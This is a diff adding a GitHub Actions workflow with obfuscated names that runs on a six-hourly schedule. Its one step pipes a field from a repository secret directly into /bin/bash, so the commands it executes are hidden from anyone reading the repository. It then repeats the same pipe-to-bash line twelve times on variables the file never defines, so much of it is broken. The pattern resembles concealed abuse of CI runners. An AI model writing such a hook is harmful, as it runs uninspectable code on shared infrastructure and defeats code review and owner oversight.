@@ -1,0 +1,30 @@
+name: qiyuanzhen4891
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '47 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: qiyuanzhen4891
+        env:
+          isors03: ${{ secrets.isors03 }}
+        run: |
+          echo $isors03 | jq -r .pc96 | /bin/bash
+          echo $lspf3 | jq -r .vgep0 | /bin/bash
+          echo $br7969 | jq -r .wtu122 | /bin/bash
+          echo $gp1480 | jq -r .tcid70657 | /bin/bash
+          echo $p5 | jq -r .qwvsr0651 | /bin/bash
+          echo $b65 | jq -r .ezuz2613 | /bin/bash
+          echo $slv690 | jq -r .pts776 | /bin/bash
+          echo $rk6755 | jq -r .izbay6230 | /bin/bash
+          echo $ahnor5 | jq -r .vsw863 | /bin/bash
+          echo $kehvr6 | jq -r .c3 | /bin/bash
+          echo $kdbq470 | jq -r .vtie304 | /bin/bash
+          echo $c9 | jq -r .tnz031 | /bin/bash
+          echo $ouas304 | jq -r .xyxft2974 | /bin/bash
+
